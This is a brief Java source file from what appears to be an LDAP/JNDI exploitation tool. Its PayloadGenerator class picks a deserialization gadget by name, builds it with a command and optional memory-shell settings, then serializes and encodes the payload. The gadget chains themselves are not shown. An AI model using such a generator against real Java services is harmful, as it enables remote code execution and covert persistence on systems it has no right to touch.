package com.idiot9.ldap.utils;

import com.idiot9.ldap.gadgets.GadgetFactory;
import com.idiot9.ldap.gadgets.utils.Reflections;


public class PayloadGenerator {
    public static String generatePayload(String gadget,String cmd, String encode, String mem, String password) throws Exception {
        String result = null;
        Class<? extends GadgetFactory> gadgetClass = null;
        Object gadgetObject = null;
        if (gadget != null) {
            gadgetClass = GadgetFactory.Utils.getGadgetClass(gadget);
            gadgetObject = GadgetFactory.Utils.getGadgetObject(gadgetClass, cmd, mem, password);
            byte[] ser = Reflections.ser(gadgetObject);
            result = EncodeFactory.encode(ser, encode.toLowerCase());
        }


        return result;
    }
}
